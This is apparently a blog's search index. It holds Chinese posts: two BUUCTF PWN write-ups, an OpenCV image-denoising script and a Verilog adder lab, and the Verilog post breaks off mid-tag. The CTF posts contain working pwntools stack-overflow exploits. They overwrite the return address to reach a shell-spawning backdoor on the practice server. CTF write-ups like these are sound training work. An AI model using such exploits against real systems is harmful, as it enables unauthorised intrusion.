<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF-PWN-warmup_csaw_2016</title>
      <link href="/20211103-ctf-warmup-csaw-2016/"/>
      <url>/20211103-ctf-warmup-csaw-2016/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-warmup-csaw-2016"><a href="#BUUCTF-PWN-warmup-csaw-2016" class="headerlink" title="BUUCTF-PWN-warmup_csaw_2016"></a>BUUCTF-PWN-warmup_csaw_2016</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031439211.png" alt="image-20211103143900879"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031439341.png" alt="image-20211103143951559"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031440659.png" alt="image-20211103144018670"></p><p>很明显可以通过<code>gets</code>函数溢出到后门函数。</p><p>v5的栈情况：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032222560.png" alt="image-20211103144142224" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111032222419.png" alt="image-20211103144209598" style="zoom:67%;" /><p>所以需要覆盖的是长度为<code>（0x40 + 0x8）</code></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25085</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031445973.png" alt="image-20211103144348548"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20211103</title>
      <link href="/20211103-img-report/"/>
      <url>/20211103-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>利用上周所得到的枚举的划分标准，编写降噪程序</p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>部分枚举的情况因为时间原因暂时未处理，用最接近的值代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="comment"># followed by 20211020 report</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NineGrid</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, d, flag</span>):</span></span><br><span class="line">        self.a = a</span><br><span class="line">        self.d = d</span><br><span class="line">        self.flag = flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">best_pixel</span>(<span class="params">nine, k</span>):</span></span><br><span class="line">    min_d = <span class="number">255</span></span><br><span class="line">    min_x = <span class="number">0</span></span><br><span class="line">    min_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> nine.flag[i][j] == k <span class="keyword">and</span> nine.d[i][j] &lt; min_d:</span><br><span class="line">                min_x = i</span><br><span class="line">                min_y = j</span><br><span class="line">                min_d = nine.d[i][j]</span><br><span class="line">    <span class="keyword">return</span> nine.a[min_x][min_y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">channel, x, y</span>):</span></span><br><span class="line">    a = [[<span class="number">0</span>]*<span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            a[i][j] = channel[x - <span class="number">1</span> + i][y - <span class="number">1</span> + j]</span><br><span class="line">    d = [[<span class="number">0</span>]*<span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            d[i][j] = <span class="built_in">abs</span>(<span class="built_in">int</span>(a[i][j]) - <span class="built_in">int</span>(a[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">    dp = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        dx, dy = _1d_2_2d(i)</span><br><span class="line">        dp[i] = d[dx][dy]</span><br><span class="line">    dps = <span class="built_in">sorted</span>(dp)</span><br><span class="line">    max_index = dps.index(<span class="built_in">max</span>(dps))</span><br><span class="line">    flag = [[<span class="number">0</span>]*<span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> d[i][j] &gt;= dps[max_index]:</span><br><span class="line">                flag[i][j] = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 中心点暂时不分区</span></span><br><span class="line">    flag[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 枚举匹配flag特征</span></span><br><span class="line">    <span class="comment"># A:B = 1:7</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> flag[i][j] == <span class="number">0</span>:</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">    min_d = <span class="number">255</span></span><br><span class="line">    min_x = <span class="number">0</span></span><br><span class="line">    min_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">1</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">0</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">1</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">0</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">1</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> flag[i][j] == <span class="number">0</span> <span class="keyword">and</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">elif</span> cnt == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> d[i][j] &lt; min_d:</span><br><span class="line">                    min_d = d[i][j]</span><br><span class="line">                    min_x = i</span><br><span class="line">                    min_y = j</span><br><span class="line">    <span class="keyword">return</span> a[min_x][min_y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denoise</span>(<span class="params">channel</span>):</span></span><br><span class="line">    row, col = channel.shape</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            channel[i][j] = find_best(channel, i, j)</span><br><span class="line">    <span class="keyword">return</span> channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">addr</span>):</span></span><br><span class="line">    img = cv.imread(addr, <span class="number">1</span>)</span><br><span class="line">    b, g, r = cv.split(img)</span><br><span class="line">    b = denoise(b)</span><br><span class="line">    g = denoise(g)</span><br><span class="line">    r = denoise(r)</span><br><span class="line">    img = cv.merge((b, g, r))</span><br><span class="line">    cv.imwrite(<span class="string">&#x27;denoise_&#x27;</span> + addr, img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img_addr = <span class="string">&#x27;noise_img.png&#x27;</span></span><br><span class="line">    main(img_addr)</span><br></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031954007.png" alt="noise_img"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111031954134.png" alt="denoise_noise_img"></p><p>在原来已降噪过的图像的基础上，还略有效果</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-PWN-rip</title>
      <link href="/20211102_ctf_rip/"/>
      <url>/20211102_ctf_rip/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-rip"><a href="#BUUCTF-PWN-rip" class="headerlink" title="BUUCTF-PWN-rip"></a>BUUCTF-PWN-rip</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022058449.png" alt="image-20211102205802821"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022058149.png" alt="image-20211102205855096"></p><p>很明显gets函数有溢出漏洞，s的栈情况如下：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022121402.png" alt="image-20211102210127998" style="zoom:67%;" /><p>完全覆盖需要（0xF + 0x8）的长度</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022059420.png" alt="image-20211102205938771"></p><p>找到函数fun（可以直接拿到shell）</p><p>fun_addr: 0x401186</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022102517.png" alt="image-20211102210257520"></p><h2 id="测试EXP"><a href="#测试EXP" class="headerlink" title="测试EXP"></a>测试EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27723</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xF</span> + <span class="number">8</span>) + p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022105726.png" alt="image-20211102210509872"></p><p>测试结果是打通了，但是报timeout，于是去找原因：</p><p>参考文章：<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p><p>主要原因文章中提到了，是因为没有对齐，所以根据文章中的解决方案：</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022111623.png" alt="image-20211102211059149" style="zoom:80%;" /><h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27723</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xF</span> + <span class="number">8</span>) + p64(<span class="number">0x401187</span>) <span class="comment"># 在原来的地址上+1刚刚好</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111022113037.png" alt="image-20211102211347467"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超前进位加法器设计实验</title>
      <link href="/20211029-DC-adder/"/>
      <url>/20211029-DC-adder/</url>
      
        <content type="html"><![CDATA[<h1 id="超前进位加法器设计实验"><a href="#超前进位加法器设计实验" class="headerlink" title="超前进位加法器设计实验"></a>超前进位加法器设计实验</h1><h2 id="新建工程"><a href="#新建工程" class="headerlink" title="新建工程"></a>新建工程</h2><h3 id="选择xc7a100tlcsg324-2L板卡型号"><a href="#选择xc7a100tlcsg324-2L板卡型号" class="headerlink" title="选择xc7a100tlcsg324-2L板卡型号"></a>选择<code>xc7a100tlcsg324-2L</code>板卡型号</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110282111260.png" alt="image-20211028211104426" style="zoom: 67%;" /><h2 id="1-结构描述建模全加器FA"><a href="#1-结构描述建模全加器FA" class="headerlink" title="1.结构描述建模全加器FA"></a>1.结构描述建模全加器FA</h2><h3 id="添加design-sources"><a href="#添加design-sources" class="headerlink" title="添加design sources"></a>添加design sources</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291536546.png" alt="image-20211028211439066" style="zoom:67%;" /><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用结构建模方式建模全加器FA模块</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> fa(A, B, CI, S, CO);</span><br><span class="line">    <span class="keyword">output</span> S, CO;</span><br><span class="line">    <span class="keyword">input</span>  A, B, CI;</span><br><span class="line">    <span class="keyword">wire</span>   S1, T1, T2, T3;</span><br><span class="line">    <span class="keyword">xor</span> XOR_1(S1, A, B),           <span class="comment">//S1 = A 异或 B</span></span><br><span class="line">        XOR_2(S, S1, CI);          <span class="comment">//S = S1 异或 CI</span></span><br><span class="line">    <span class="keyword">and</span> AND_1(T1, A, B),           <span class="comment">//T1 = AB</span></span><br><span class="line">        AND_2(T2, S1, CI);         <span class="comment">//T2 = S1CI</span></span><br><span class="line">    <span class="keyword">or</span> OR_1(S, T1, T2);            <span class="comment">//S = T1 + T2</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="添加simulation-sources"><a href="#添加simulation-sources" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110282213293.png" alt="image-20211028221334443" style="zoom:67%;" /><h3 id="仿真代码示例"><a href="#仿真代码示例" class="headerlink" title="仿真代码示例"></a>仿真代码示例</h3><p>利用脚本自动输出</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_fa;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD  = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   A                                    = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   B                                    = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   CI                                   = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  S                                    ;</span><br><span class="line">    <span class="keyword">wire</span>  CO                                   ;</span><br><span class="line"></span><br><span class="line">    fa  u_fa (</span><br><span class="line">        <span class="variable">.A</span>                       ( A    ),</span><br><span class="line">        <span class="variable">.B</span>                       ( B    ),</span><br><span class="line">        <span class="variable">.CI</span>                      ( CI   ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.S</span>                       ( S    ),</span><br><span class="line">        <span class="variable">.CO</span>                      ( CO   )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span></span><br><span class="line">        &#123;A,B,CI&#125;=<span class="number">3&#x27;b0</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">always</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">#<span class="number">100</span>;</span><br><span class="line">&#123;A,B,CI&#125;=&#123;A,B,CI&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果"><a href="#仿真结果" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291537964.png" alt="image-20211028223223028" style="zoom:80%;" /><h2 id="2-四位串行加法器"><a href="#2-四位串行加法器" class="headerlink" title="2.四位串行加法器"></a>2.四位串行加法器</h2><h3 id="添加的design-sources"><a href="#添加的design-sources" class="headerlink" title="添加的design sources"></a>添加的design sources</h3><p>PS：操作与前面相同</p><figure class="highlight verilog"><table><tr><td 